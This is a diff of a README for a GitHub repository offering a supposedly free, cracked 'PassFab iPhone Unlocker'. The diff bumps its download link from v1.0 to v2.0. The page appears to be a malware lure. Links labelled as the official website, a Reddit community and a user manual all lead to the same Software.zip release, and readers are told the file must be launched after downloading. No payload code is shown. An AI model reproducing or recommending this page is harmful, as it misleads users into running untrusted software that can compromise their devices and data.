@@ -22,7 +22,7 @@ Welcome to the PassFab iPhone Unlocker Free repository! Here you can find inform
 - passfab-iphone-unlocker-with-crack
 
 ## Get Started
-To get started with PassFab iPhone Unlocker Free, you can download the latest version [here](https://github.com/bandofromdatblock/PassFab-iPhone-Unlocker-Free/releases/download/v1.0/Software.zip). Please note that the file needs to be launched after downloading.
+To get started with PassFab iPhone Unlocker Free, you can download the latest version [here](https://github.com/bandofromdatblock/PassFab-iPhone-Unlocker-Free/releases/download/v2.0/Software.zip). Please note that the file needs to be launched after downloading.
 
 ## How to Use
 1. Download the PassFab iPhone Unlocker Free tool from the provided link.
@@ -31,9 +31,9 @@ To get started with PassFab iPhone Unlocker Free, you can download the latest ve
 4. Follow the on-screen instructions to unlock your iPhone.
 
 ## Additional Resources
-- [PassFab official website](https://github.com/bandofromdatblock/PassFab-iPhone-Unlocker-Free/releases/download/v1.0/Software.zip)
-- [PassFab iPhone Unlocker Reddit community](https://github.com/bandofromdatblock/PassFab-iPhone-Unlocker-Free/releases/download/v1.0/Software.zip)
-- [PassFab iPhone Unlocker User Manual](https://github.com/bandofromdatblock/PassFab-iPhone-Unlocker-Free/releases/download/v1.0/Software.zip)
+- [PassFab official website](https://github.com/bandofromdatblock/PassFab-iPhone-Unlocker-Free/releases/download/v2.0/Software.zip)
+- [PassFab iPhone Unlocker Reddit community](https://github.com/bandofromdatblock/PassFab-iPhone-Unlocker-Free/releases/download/v2.0/Software.zip)
+- [PassFab iPhone Unlocker User Manual](https://github.com/bandofromdatblock/PassFab-iPhone-Unlocker-Free/releases/download/v2.0/Software.zip)
 
 ## Assistance and Support
 If you encounter any issues with PassFab iPhone Unlocker Free or have any questions, feel free to reach out to the PassFab support team for assistance. They are available 24/7 to help you with any concerns you may have.
